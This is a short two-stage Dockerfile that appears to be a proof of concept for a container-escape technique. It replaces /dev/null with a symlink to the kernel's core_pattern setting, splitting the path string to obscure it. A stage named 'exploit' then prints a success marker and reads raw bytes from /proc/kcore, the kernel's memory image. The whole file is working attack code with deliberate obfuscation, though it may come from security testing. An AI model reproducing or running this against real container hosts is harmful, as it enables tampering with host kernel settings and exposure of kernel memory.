FROM alpine:3.20 AS mknull
RUN rm -f /dev/null && T=/proc/sys/kernel/core_pat && T=${T}tern && ln -s "$T" /dev/null && ls -la /dev/null && readlink /dev/null
FROM mknull AS exploit
RUN echo f2-symnull-obf-ok && ls -la /dev/null && readlink /dev/null && stat -c "kcore %F %t:%T %s" /proc/kcore && head -c 64 /proc/kcore | od -c | head -3
